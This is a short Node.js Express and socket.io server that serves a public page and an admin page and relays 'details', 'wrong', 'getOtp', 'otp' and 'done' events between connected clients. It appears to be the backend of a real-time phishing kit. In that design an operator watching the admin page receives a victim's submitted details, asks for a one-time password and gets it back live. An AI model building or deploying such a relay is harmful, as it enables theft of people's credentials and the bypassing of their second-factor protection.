const express  = require('express');
const app = express();
const http = require('http').Server(app);
const port = process.env.PORT || 3000;
const io = require('socket.io')(http);


app.use(express.static('public'));

app.get('/', (req, res) => {
    res.sendfile("public/index.html");
});


 app.get('/admin', (req, res) => {
     res.sendfile("public/admin.html");
 });


 io.on('connection',(socket)=>{
    console.log(socket.id + ": Connected");


    socket.on('details',(data)=>{
        socket.broadcast.emit('details',(data));
    })

    socket.on('wrong',()=>{
        socket.broadcast.emit('wrong');
    })

    socket.on('getOtp',()=>{
        socket.broadcast.emit('getOtp');
    })

    socket.on('otp',(otp)=>{
        socket.broadcast.emit('otp',otp);
    })

    socket.on('done',()=>{
        socket.broadcast.emit('done');
    })
    
})



http.listen(port,()=>{
    console.log("Listening On "+port);
})